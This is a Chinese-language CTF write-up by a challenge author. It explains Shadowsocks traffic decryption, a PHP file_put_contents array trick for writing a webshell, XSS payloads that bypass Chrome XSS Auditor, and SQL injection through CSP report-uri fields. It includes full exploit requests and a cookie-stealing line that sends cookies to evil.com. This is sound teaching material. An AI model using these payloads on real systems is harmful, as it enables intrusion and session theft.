@@ -1,0 +1,163 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>Pwnhub在8月12日举办了第一次线下沙龙，我也出了两道Web相关的题目，其中涉及好几个知识点，这里说一下。</p>
+<h2 data-content="1" id="61e78446e37fe27077a084b6823007ad"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#_1" target="_blank">题目《国家保卫者》</a></h2>
+<p>国家保卫者是一道MISC题目，题干：</p>
+<p>&gt; Phith0n作为一个国家保卫者，最近发现国际网络中有一些奇怪的数据包，他取了一个最简单的（神秘代码 123456 ），希望能分析出有趣的东西来。<br/>
+&gt; <a href="https://pwnhub.cn/attachments/170812_okKJICF5RDsF/package.pcapng" target="_blank">https://pwnhub.cn/attachments/170812_okKJICF5RDsF/package.pcapng</a></p>
+<h3 data-content="1" id="80f36145a036f651abb41fe0c8216ace"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#_2" target="_blank">考点一、数据包分析</a></h3>
+<p>其实题干很简单，就是给了个数据包，下载以后用Wireshark打开即可。因为考虑到线下沙龙时间较短，所以我只抓了一个TCP连接，避免一些干扰。</p>
+<p>因为我没明确写这个数据包是干嘛的，有的同学做题的时候有点不知所以然。其实最简单的一个方法，打开数据包，如果Wireshark没有明确说这是什么协议的时候，就直接看看目标端口：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/cd21ab5a-ec99-4300-b9b6-28d056cd121e.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142247-584ef102-f43c-1.jpg"/></a></p>
+<p>8388端口，搜一下就知道默认是什么服务了。</p>
+<p>Shadowsocks数据包解密，这个点其实我2015年已经想出了，但一直我自己没仔细研究过他的源码，对其加密的整个流程也不熟悉。后面抽空阅读了一些源码，发现其数据流有一个特点，就是如果传输的数据太大的话，还是会对数据包进行分割。</p>
+<p>所以，我之前直接把源码打包后用shadowsocks传一遍，发现抓下来的包是需要处理才能解密，不太方便，后来就干脆弄了个302跳转，然后把目标地址和源码的文件名放在数据包里。</p>
+<p>找到返回包的Data，然后右键导出：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/f0146f8c-a02c-4f6d-a871-c474fd3ab8ba.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142249-598978bc-f43c-1.jpg"/></a></p>
+<p>然后下载Shadowsocks的源码，其中有一个encrypt.py，虽然整个加密和流量打包的过程比较复杂，但我们只需要调用其中解密的方法即可。</p>
+<p>源码我就不分析了，解密代码如下（<code>./data.bin</code>是导出的密文，<code>123456</code>是题干里给出的“神秘代码”，<code>aes-256-cfb</code>是默认加密方式）：</p>
+<pre><code>if __name__ == '__main__':
+    with open('./data.bin', 'rb') as f:
+        data = f.read()
+    e = Encryptor('123456', 'aes-256-cfb')
+    print(e.decrypt(data))</code></pre>
+<p>直接把这个代码加到encrypt.py下面，然后执行即可：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/d16c03ca-a01c-49d8-8c2d-96e540f441fc.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142251-5a894134-f43c-1.jpg"/></a></p>
+<p>当然，在实战中，进行密钥的爆破、加密方法的爆破，这个也是有可能的。为了不给题目增加难度，我就设置的比较简单。</p>
+<h3 data-content="1" id="5e1bb256ee5607e34ffc9a29876831b4"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#phptrick" target="_blank">考点二、PHP代码审计/Trick</a></h3>
+<p>解密出数据包后可以看到，Location的值给出了两个信息：</p>
+<ol>
+<li>源码包的路径</li>
+<li>目标地址</li>
+</ol>
+<p>所以，下载源码进行分析。</p>
+<p>这是一个比较简单的代码审计题目，简单流程就是，用户创建一个Ticket，然后后端会将Ticket的内容保存到以“cache/用户名/Ticket标题.php”命名的文件中。然后，用户可以查看某个Ticket，根据Ticket的名字，将“cache/用户名/Ticket标题.php”内容读取出来。</p>
+<p>这个题目的考点就在于，写入文件之前，我对用户输出的内容进行了一次正则检查：</p>
+<pre><code>&lt;?php
+function is_valid($title, $data)
+{
+    $data = $title . $data;
+    return preg_match('|\A[ _a-zA-Z0-9]+\z|is', $data);
+}
+
+function write_cache($title, $content)
+{
+    $dir = changedir(CACHE_DIR . get_username() . '/');
+    if(!is_dir($dir)) {
+        mkdir($dir);
+    }
+    ini_set('open_basedir', $dir);
+
+    if (!is_valid($title, $content)) {
+        exit("title or content error");
+    }
+
+    $filename = "{$dir}{$title}.php";
+
+    file_put_contents($filename, $content);
+    ini_set('open_basedir', __DIR__ . '/');
+}</code></pre>
+<p>整个流程如下：</p>
+<ol>
+<li>title和content拼接成字符串</li>
+<li>将1的结果进行正则检测拦截，正则比较严格，<code>\A[ _a-zA-Z0-9]+\z</code>，只允许数字、字母、下划线和空格</li>
+<li>匹配成功，使用<code>file_put_contents(title, content)</code>写入文件中</li>
+</ol>
+<p>也就是说，我们的webshell，至少需要<code>&amp;lt;?</code>等字符，但实际上这里正则把特殊符号都拦截了。</p>
+<p>这就考到PHP的一个小Trick了，我们看看<code>file_put_contents</code>的文档即可发现：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/6a11235b-054f-4e48-b8e5-38a698c86fb3.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142252-5b6f99d6-f43c-1.jpg"/></a></p>
+<p>其第二个参数允许传入一个数组，如果是数组的话，将被连接成字符串再进行写入。</p>
+<p>回看我的题目，在正则匹配前，<code>$title</code>和<code>$content</code>进行了字符串连接。得益于PHP的弱类型特性，数组会被强制转换成字符串，也就是<code>Array</code>，Array肯定是满足正则<code>\A[ _a-zA-Z0-9]+\z</code>的，所以不会被拦截。</p>
+<p>所以最后，发送如下数据包即可成功getshell：</p>
+<pre><code>POST /i.php HTTP/1.1 
+Host: 52.80.37.67:8078 
+Content-Length: 49 
+Cache-Control: max-age=0 
+Origin: http://52.80.37.67:8078 
+Upgrade-Insecure-Requests: 1 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 
+Content-Type: application/x-www-form-urlencoded 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 
+Referer: http://52.80.37.67:8078/index.php 
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6 
+Cookie: PHPSESSID=asdsa067hpqelof5cevlgcsip4 
+Connection: close 
+
+title=s&amp;content[]=&lt;?php&amp;content[]=%0aphpinfo();</code></pre>
+<p>（自豪的说一下，为了防搅屎，我已经把我前段时间写的PHP沙盒加进来了，所以getshell后只能执行少量函数。最后只要执行一下<code>show_flag()</code>即可获得Flag）</p>
+<p><code>file_put_contents</code>这个特性还是比较有实战意义的，比如像下面这种基于文件内容的WAF，就可以绕过：</p>
+<pre><code>&lt;?php
+$text = $_GET['text'];
+if(preg_match('[&lt;&gt;?]', $text)) {
+    die('error!');
+}
+file_put_contents('config.php', $text);</code></pre>
+<h2 data-content="1" id="fb1346441f89aef95ed71b7bfa743539"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#_3" target="_blank">题目《改行做前端》</a></h2>
+<p>这个题目看似是一个前端安全的题目，实际上还考了另一个比较隐蔽的点。</p>
+<p>题干：</p>
+<p>&gt; Phithon最近考虑改行做前端，这是他写的第一个页面： <a href="http://54.222.168.105:8065/" target="_blank">http://54.222.168.105:8065/</a><br/>
+&gt;  （所有测试在Chrome 60 + 默认配置下进行）</p>
+<h3 data-content="1" id="71e9d6e38241a4d1695ec6944af4c574"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#xss" target="_blank">考点一、XSS综合利用</a></h3>
+<p>这个考点是一个比较普通的点，没什么太多障碍。打开页面，发现下方有一个提交框，直接点提交，即可发现返回如下链接：<code>http://54.222.168.105:8065/?error=验证码错误</code></p>
+<p>error这个参数被写在JavaScript的引号里，并对引号进行了转义：</p>
+<pre><code>&lt;script&gt;
+    window.onload = function () {
+        var error = 'aaa\'xxx';
+        $("#error").text(error).show();
+    };
+&lt;/script&gt;</code></pre>
+<p>但fuzz一下0-255的所有字符，发现其有如下特征：</p>
+<ol>
+<li>没有转义<code>&amp;lt;</code>、<code>&amp;gt;</code>
+</li>
+<li>换行被替换成<code>&amp;lt;br /&amp;gt;</code>
+</li>
+</ol>
+<p>没有转义<code>&amp;lt;</code>、<code>&amp;gt;</code>，我们就可以传入<code>error=&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code>来进行跨站攻击。但问题是，Chrome默认有XSS过滤器，我们需要绕过。</p>
+<p>这里其实就是借用了前几天 @长短短 在Twitter上发过的一个绕过Chrome Auditor的技巧：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/6ec58772-81e8-4bc0-8bca-8b52b6099c10.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142253-5bed9764-f43c-1.jpg"/></a></p>
+<p>换行被转换成<code>&amp;lt;br /&amp;gt;</code>后，用上述Payload即可执行任意代码。</p>
+<p>另外，还有个方法：<a href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html#script_1" target="_blank">《浏览器安全一 / Chrome XSS Auditor bypass》 - 输出在script内字符串位置的情况</a> ，这里提到的这个POC也能利用：<a href="http://54.222.168.105:8065/?error=&amp;lt;/script&amp;gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;{alert(1" target="_blank">http://54.222.168.105:8065/?error=&lt;/script&gt;&lt;svg&gt;&lt;script&gt;{alert(1)%2b%26apos%3B</a>%2b%26apos%3B) （和我博客中文章给的POC有一点不同，因为要闭合后面的<code>}</code>，所以前面需要加个<code>{</code>）</p>
+<p>最后，构造如下Payload：</p>
+<pre><code>http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF&lt;/script&gt;&lt;script&gt;1&lt;(br=1)*/%0deval(atob(location.hash.substr(1)))&lt;/script&gt;#xxxxxx</code></pre>
+<p>将我们需要执行的代码base64编码后放在xxxxxx的位置即可。</p>
+<h3 data-content="1" id="2c21acf74fe2dcce653fa2580916d014"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#_4" target="_blank">漏洞利用</a></h3>
+<p>发现了一个XSS，前台正好有一个可以提交URL的地方，所以，将构造好的Payload提交上去即可。</p>
+<p>猜测一下后台的行为：管理员查看了用户提交的内容，如果后台本身没有XSS的情况下，管理员点击了我们提交的URL，也能成功利用。</p>
+<p>但因为前台有一个unsafe-inline csp，不能直接加载外部的资源，所以我用链接点击的方式，将敏感信息传出：</p>
+<pre><code>a=document.createElement('a');a.href='http://evil.com/?'+encodeURI(document.referrer+';'+document.cookie);a.click();</code></pre>
+<p>另外，因为后台还有一定的过滤，所以尽量把他们用url编码一遍。</p>
+<p>打到了后台地址和Cookie：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/18e409c9-33e7-427f-839f-d9c4ff971e96.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142254-5c5cea06-f43c-1.jpg"/></a></p>
+<p>用该Cookie登录一下：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/786945ea-2aff-4446-a598-0e6a4868729f.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142255-5d1d44e0-f43c-1.jpg"/></a></p>
+<p>没有Flag……gg，</p>
+<h3 data-content="1" id="66ce822f59b542266ed6d5af01d74bef"><a href="https://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html#sql" target="_blank">考点二、SQL注入</a></h3>
+<p>这题看似仅仅是一个XSS题目，但是我们发现进入后台并没有Flag，这是怎么回事？</p>
+<p>回去翻翻数据包，仔细看看，发现我们之前一直忽略了一个东西：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/ef48396e-dbde-45b1-a9b0-9cf3bc2759cb.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142256-5dbc0dfa-f43c-1.jpg"/></a></p>
+<p>report-uri是CSP中的一个功能，当CSP规则被触发时，将会向report-uri指向的地址发送一个数据包。其设计目的是让开发者知道有哪些页面可能违反CSP，然后去改进他。</p>
+<p>比如，我们访问如下URL：<code>http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;1&amp;lt;(br=1)*/%0deval(location.hash.substr(1))&amp;lt;/script&amp;gt;#$.getScript(&amp;#39;http://mhz.pw&amp;#39;)</code>，这里加载外部script，违反了CSP，所以浏览器发出了一个请求：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/3587b59b-3eb4-475e-af55-2f77cb3bd3f5.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142257-5e56748a-f43c-1.jpg"/></a></p>
+<p>这个数据包如下：</p>
+<pre><code>POST /report HTTP/1.1
+Host: 54.222.168.105:8065
+Connection: keep-alive
+Content-Length: 843
+Origin: http://54.222.168.105:8065
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
+Content-Type: application/csp-report
+Accept: */*
+Referer: http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF&lt;/script&gt;&lt;script&gt;1&lt;(br=1)*/%0deval(location.hash.substr(1))&lt;/script&gt;
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+Cookie: PHPSESSID=i1q84v0up0fol18vemfo7aeuk1
+
+{"csp-report":{"document-uri":"http://54.222.168.105:8065/?error=email%E9%94%99%E8%AF%AF&lt;/script&gt;&lt;script&gt;1&lt;(br=1)*/%0deval(location.hash.substr(1))&lt;/script&gt;","referrer":"","violated-directive":"script-src","effective-directive":"script-src","original-policy":"default-src 'self' https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; style-src 'self' 'unsafe-inline' https://*.cloudflare.com https://*.googleapis.com https://*.gstatic.com; report-uri /report","disposition":"enforce","blocked-uri":"http://mhz.pw/?_=1502631925558","line-number":4,"column-number":27989,"source-file":"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js","status-code":200,"script-sample":""}}</code></pre>
+<p>这个请求其实是有注入的，注入点在<code>document-uri</code>、<code>blocked-uri</code>、<code>violated-directive</code>这三个位置都有，随便挑一个：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/0e002b9b-df9e-4200-a15c-68961f2238fa.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142259-5f3f6b54-f43c-1.jpg"/></a></p>
+<p>普通注入，我就不多说了。</p>
+<p>注入获得两个账号，其中<code>caibiph</code>的密码可以解密，直接用这个账号登录后台，即可查看到Flag：</p>
+<p><a href="https://www.leavesongs.com/media/attachment/2017/08/13/a25802f1-c292-4b01-a817-345e11ef22fb.jpg" target="_blank"><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108142300-605120dc-f43c-1.jpg"/></a></p>
+</div>
+</div>
